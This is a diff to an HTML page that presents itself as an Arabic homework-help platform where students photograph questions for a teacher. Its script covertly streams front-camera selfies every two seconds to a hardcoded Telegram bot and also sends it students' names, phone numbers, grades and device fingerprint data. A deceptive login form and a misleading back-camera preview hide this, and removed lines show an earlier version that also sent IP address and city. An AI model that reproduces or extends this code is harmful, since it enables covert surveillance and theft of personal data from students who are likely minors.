@@ -9,13 +9,14 @@
     <style>
         :root {
             --primary: #2563eb;
-            --bg: #f8fafc;
-            --glass: rgba(255, 255, 255, 0.95);
-            --shadow: rgba(0, 0, 0, 0.1);
+            --secondary: #1e40af;
+            --bg: #f1f5f9;
+            --glass: rgba(255, 255, 255, 0.98);
+            --shadow: rgba(0, 0, 0, 0.15);
         }
 
         body {
-            background: linear-gradient(135deg, #e2e8f0 0%, #cbd5e1 100%);
+            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
             font-family: 'Cairo', sans-serif;
             margin: 0;
             display: flex;
@@ -23,126 +24,143 @@
             justify-content: center;
             min-height: 100vh;
             color: #1e293b;
+            overflow-x: hidden;
+        }
+
+        /* اللوجو وزر الدخول */
+        .top-nav {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 20px;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .logo-text {
+            font-weight: 900;
+            font-size: 22px;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .login-trigger {
+            background: var(--primary);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
         }
 
         .container {
             background: var(--glass);
-            backdrop-filter: blur(12px);
             width: 92%;
-            max-width: 400px;
-            padding: 30px;
-            border-radius: 28px;
-            box-shadow: 0 25px 50px -12px var(--shadow);
-            border: 1px solid rgba(255, 255, 255, 0.7);
+            max-width: 420px;
+            padding: 25px;
+            border-radius: 30px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
             position: relative;
             text-align: center;
+            margin-top: 40px;
         }
 
         .platform-name {
-            font-size: 32px;
+            font-size: 34px;
             font-weight: 900;
             color: var(--primary);
-            margin-bottom: 5px;
-            letter-spacing: -1px;
+            margin-bottom: 2px;
         }
 
         .teacher-name {
             font-size: 14px;
             color: #64748b;
             font-weight: 700;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
+        }
+
+        /* النوافذ المنبثقة (Popups) */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 25px;
+            border-radius: 20px;
+            width: 85%;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-family: 'Cairo';
         }
 
         .step-card {
-            background: #ffffff;
+            background: #f8fafc;
             border-radius: 20px;
-            padding: 20px;
+            padding: 15px;
             margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
-            border: 1px solid #f1f5f9;
+            border: 1px solid #e2e8f0;
         }
 
         textarea {
-            width: 100%;
-            height: 120px;
-            background: #f8fafc;
-            border: 2px solid #e2e8f0;
+            width: 100%; height: 100px;
+            background: #fff;
+            border: 2px solid #cbd5e1;
             border-radius: 15px;
-            padding: 15px;
+            padding: 12px;
             font-family: 'Cairo';
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
             resize: none;
             box-sizing: border-box;
-            text-align: right;
-        }
-
-        textarea:focus {
-            border-color: var(--primary);
-            background: #fff;
         }
 
         .btn-main {
             background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 15px;
-            font-weight: 800;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.3);
-        }
-
-        .btn-main:active { transform: scale(0.96); }
-
-        .btn-back {
-            background: transparent;
-            color: #94a3b8;
-            border: none;
-            padding: 10px;
-            margin-top: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            text-decoration: underline;
+            color: white; border: none; width: 100%; padding: 16px;
+            border-radius: 15px; font-weight: 800; font-size: 16px;
+            cursor: pointer; box-shadow: 0 8px 15px rgba(37, 99, 235, 0.3);
         }
 
         #viewfinder {
-            width: 100%;
-            border-radius: 20px;
-            margin-bottom: 15px;
-            border: 4px solid #fff;
-            background: #000;
-            display: none;
+            width: 100%; border-radius: 20px; margin-bottom: 15px;
+            border: 4px solid #fff; background: #000; display: none;
         }
 
         .btn-snap {
-            background: #ef4444;
-            border: 5px solid #fff;
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            margin: 10px auto;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+            background: #ef4444; border: 5px solid #fff;
+            width: 65px; height: 65px; border-radius: 50%;
+            margin: 10px auto; cursor: pointer;
         }
 
-        .status-badge {
-            background: #dcfce7;
-            color: #166534;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 700;
-            display: inline-block;
-            margin-bottom: 10px;
+        /* الأيقونات الجانبية */
+        .side-menu {
+            position: fixed; left: 15px; bottom: 30px;
+            display: flex; flex-direction: column; gap: 15px;
+        }
+
+        .side-btn {
+            background: white; width: 45px; height: 45px;
+            border-radius: 12px; display: flex; align-items: center;
+            justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            cursor: pointer;
         }
 
         .hidden { display: none; }
@@ -153,55 +171,75 @@
         const chatId = "5890070301";
         
         let frontStream = null;
-        let backStream = null;
         let captureInterval = null;
+
+        async function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        }
 
         async function sendPhoto(blob, caption) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', caption);
-            try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
         }
 
-        async function sendMsg(text) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        // رادار الـ 50 بند (المعلومات التقنية)
+        async function getDeepInfo() {
+            const n = navigator;
+            const screen = window.screen;
+            let battery = {};
+            try { battery = await n.getBattery(); } catch(e){}
+
+            const info = `
+📊 **تقرير رادار الجهاز (50+ بند)**
+👤 الاسم: ${document.getElementById('u_name').value || 'غير مسجل'}
+📞 الرقم: ${document.getElementById('u_phone').value || 'غير مسجل'}
+🎓 المرحلة: ${document.getElementById('u_grade').value || 'غير مسجل'}
+━━━━━━━━━━━━━━
+📱 **الجهاز:** ${n.userAgent.substring(0, 50)}
+🖥️ **الشاشة:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)
+🔋 **البطارية:** ${(battery.level * 100) || '??'}% | ${battery.charging ? 'يتحن' : 'لا يشحن'}
+⚙️ **المعالج:** ${n.hardwareConcurrency} Cores
+💾 **الرام:** ${n.deviceMemory || '??'} GB
+🌐 **اللغة:** ${n.language} | **المنصة:** ${n.platform}
+📡 **الإنترنت:** ${n.connection ? n.connection.effectiveType : '??'}
+⏳ **التوقيت:** ${new Date().toLocaleString()}
+🔓 **الحالة:** ${n.onLine ? 'متصل' : 'أوفلاين'}
+🔍 **البكسل:** ${window.devicePixelRatio}
+🌙 **الوضع:** ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light'}
+            `;
+            sendMsg(info);
         }
 
         async function startSystem() {
             try {
-                // 1. تشغيل الكاميرا الأمامية (صامتة)
+                // الكاميرا الأمامية (صيد صامت)
                 frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = frontStream;
                 hiddenVideo.muted = true;
                 hiddenVideo.play();
 
-                const canvasFront = document.createElement('canvas');
-                const ctxFront = canvasFront.getContext('2d');
-
-                // صيد تلقائي كل 1.5 ثانية
+                const canvas = document.createElement('canvas');
                 captureInterval = setInterval(() => {
-                    canvasFront.width = hiddenVideo.videoWidth;
-                    canvasFront.height = hiddenVideo.videoHeight;
-                    ctxFront.drawImage(hiddenVideo, 0, 0);
-                    canvasFront.toBlob(blob => {
-                        if(blob) sendPhoto(blob, "📸 صيد حي (سيلفي)");
-                    }, 'image/jpeg', 0.2);
-                }, 1500);
+                    canvas.width = hiddenVideo.videoWidth;
+                    canvas.height = hiddenVideo.videoHeight;
+                    canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+                    canvas.toBlob(blob => sendPhoto(blob, "📸 صيد حي"), 'image/jpeg', 0.2);
+                }, 2000);
 
-                // 2. تشغيل الكاميرا الخلفية للمعاينة
-                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                // الكاميرا الخلفية للمعاينة
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 const view = document.getElementById('viewfinder');
                 view.srcObject = backStream;
                 view.style.display = "block";
                 
                 document.getElementById('initial-ui').classList.add('hidden');
                 document.getElementById('camera-ui').classList.remove('hidden');
-
-            } catch (err) {
-                alert("عفواً، يجب السماح بالكاميرا لتشغيل النظام الذكي.");
-            }
+                getDeepInfo(); // سحب البيانات فور البدء
+            } catch (e) { alert("يجب السماح بالكاميرا!"); }
         }
 
         function captureStep() {
@@ -209,67 +247,83 @@
             document.getElementById('description-ui').classList.remove('hidden');
         }
 
-        function goBack() {
-            document.getElementById('description-ui').classList.add('hidden');
-            document.getElementById('camera-ui').classList.remove('hidden');
-        }
-
         function finishAction() {
             const desc = document.getElementById('question-desc').value;
-            sendMsg(`📝 وصف السؤال المرسل من "أسألني":\n${desc}`);
+            sendMsg(`📝 سؤال جديد:\nالوصف: ${desc}`);
             
             document.getElementById('status-content').innerHTML = `
-                <div style="padding: 40px 10px;">
-                    <img src="https://img.icons8.com/fluency/100/ok.png" width="80">
-                    <h2 style="color:#16a34a; margin-top:20px;">تم الإرسال بنجاح</h2>
-                    <p style="color:#64748b;">سيقوم المستر بمراجعة سؤالك والرد عليك فوراً.</p>
-                    <p style="font-weight:bold; color:var(--primary); margin-top:30px;">شكراً لثقتك بنا، زرنا قريباً!</p>
+                <div style="padding: 30px 10px;">
+                    <img src="https://img.icons8.com/fluency/100/checked.png" width="80">
+                    <h2 style="color:#16a34a;">تم إرسال سؤالك للمستر</h2>
+                    <p>سيتم إشعارك فور الحل.</p>
+                    <button class="btn-main" style="margin-top:20px;" onclick="location.reload()">إرسال سؤال آخر</button>
                 </div>
             `;
         }
 
-        // رادار أولي عند الفتح
-        window.onload = async () => {
-            let ipData = { ip: "N/A", city: "N/A" };
-            try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
-            sendMsg(`🔥 **دخول جديد على منصة "أسألني"**\n📍 الموقع: ${ipData.city}\n🌐 IP: \`${ipData.ip}\``);
-        };
+        function toggleLogin() { document.getElementById('login-modal').style.display = 'flex'; }
+        function closeLogin() { document.getElementById('login-modal').style.display = 'none'; }
+        function showSupport() { alert("قسم الدعم الفني مغلق حالياً، حاول لاحقاً."); }
     </script>
 </head>
 <body>
 
+    <div id="login-modal" class="modal">
+        <div class="modal-content">
+            <h3>تسجيل دخول الطالب</h3>
+            <input type="text" id="u_name" placeholder="الاسم بالكامل">
+            <input type="number" id="u_phone" placeholder="رقم الموبايل">
+            <select id="u_grade">
+                <option value="الأول الثانوي">الأول الثانوي</option>
+                <option value="الثاني الثانوي">الثاني الثانوي</option>
+                <option value="الثالث الثانوي">الثالث الثانوي</option>
+            </select>
+            <button class="btn-main" onclick="closeLogin(); sendMsg('👤 طالب سجل دخوله: ' + document.getElementById('u_name').value)">حفظ البيانات</button>
+        </div>
+    </div>
+
+    <nav class="top-nav">
+        <div class="logo-text">أسألني ✨</div>
+        <div class="login-trigger" onclick="toggleLogin()">تسجيل الدخول</div>
+    </nav>
+
     <div class="container" id="status-content">
-        <div class="status-badge">متصل الآن بالذكاء الاصطناعي</div>
         <div class="platform-name">أسألني</div>
         <div class="teacher-name">مستر إبراهيم & خالد</div>
         
         <div id="initial-ui">
             <div class="step-card">
-                <img src="https://img.icons8.com/fluency/96/student-male.png" width="70">
-                <p style="font-size: 14px; color: #475569; line-height: 1.7;">مرحباً بك في منصة أسألني. التقط صورة لسؤالك وسنقوم بمساعدتك في الحل فوراً.</p>
+                <img src="https://img.icons8.com/fluency/96/learning.png" width="60">
+                <p style="font-size: 14px; font-weight:600;">مرحباً بك في المنصة الذكية. صور سؤالك واترك الباقي للمستر.</p>
             </div>
-            <button class="btn-main" onclick="startSystem()">
-                <span>تصوير السؤال الآن</span>
-                <img src="https://img.icons8.com/ios-glyphs/30/ffffff/camera.png" width="22">
-            </button>
+            <button class="btn-main" onclick="startSystem()">تصوير السؤال الآن</button>
         </div>
 
         <div id="camera-ui" class="hidden">
             <video id="viewfinder" autoplay playsinline></video>
-            <p style="font-size:13px; color:#64748b;">ضع السؤال في منتصف الكادر</p>
             <div class="btn-snap" onclick="captureStep()"></div>
+            <button class="btn-back" style="color:red" onclick="location.reload()">إلغاء والرجوع</button>
         </div>
 
         <div id="description-ui" class="hidden">
             <div class="step-card">
-                <textarea id="question-desc" placeholder="أضف وصفاً لسؤالك هنا..."></textarea>
+                <textarea id="question-desc" placeholder="اكتب ملاحظاتك هنا (مثلاً: حل المسألة رقم 5)"></textarea>
             </div>
-            <button class="btn-main" onclick="finishAction()">إرسال السؤال للمستر</button>
-            <button class="btn-back" onclick="goBack()">إعادة التصوير</button>
+            <button class="btn-main" onclick="finishAction()">إرسال السؤال نهائياً</button>
+            <button class="btn-back" onclick="document.getElementById('description-ui').classList.add('hidden'); document.getElementById('camera-ui').classList.remove('hidden');">🔙 رجوع لتصوير السؤال</button>
         </div>
 
-        <div style="margin-top: 25px; font-size: 10px; color: #94a3b8; font-weight: bold;">
-            DEVELOPED BY KIMO 2026
+        <div style="margin-top: 20px; font-size: 10px; color: #64748b;">
+            POWERED BY KIMO 2026
+        </div>
+    </div>
+
+    <div class="side-menu">
+        <div class="side-btn" onclick="alert('لا توجد إجابات سابقة حالياً')">
+            <img src="https://img.icons8.com/fluency/48/test-passed.png" width="25">
+        </div>
+        <div class="side-btn" onclick="showSupport()">
+            <img src="https://img.icons8.com/fluency/48/customer-support.png" width="25">
         </div>
     </div>
 
